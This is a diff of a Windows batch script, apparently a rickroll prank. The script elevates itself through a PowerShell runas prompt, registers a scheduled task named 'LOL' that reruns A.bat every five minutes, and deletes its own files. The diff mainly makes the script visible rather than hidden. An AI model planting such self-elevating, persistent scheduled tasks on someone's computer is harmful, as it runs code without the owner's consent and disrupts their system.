@@ -1,4 +1,4 @@
-@echo off
+@echo on
  whoami /all | findstr S-1-16-12288 > nul
  if %errorlevel%==1 goto NotAdmin
 cd /D "%~dp0"
@@ -13,6 +13,7 @@ Schtasks /create /sc DAILY /tn LOL /tr "C:%homepath%\A.bat" /ri 5 /du 24:00
 del A.bat
 del rickroll.mp3
 del Test.bat
+timeout -1
 exit
 timeout -1
 :NotAdmin
@@ -21,7 +22,7 @@ powershell -command "Start-Process Test.bat -Verb runas" && (
 timeout -1
 ) || (
   echo yourCommand failed
-powershell start .\Test.bat -windowstyle hidden
+powershell start .\Test.bat 
 exit
 )
 exit
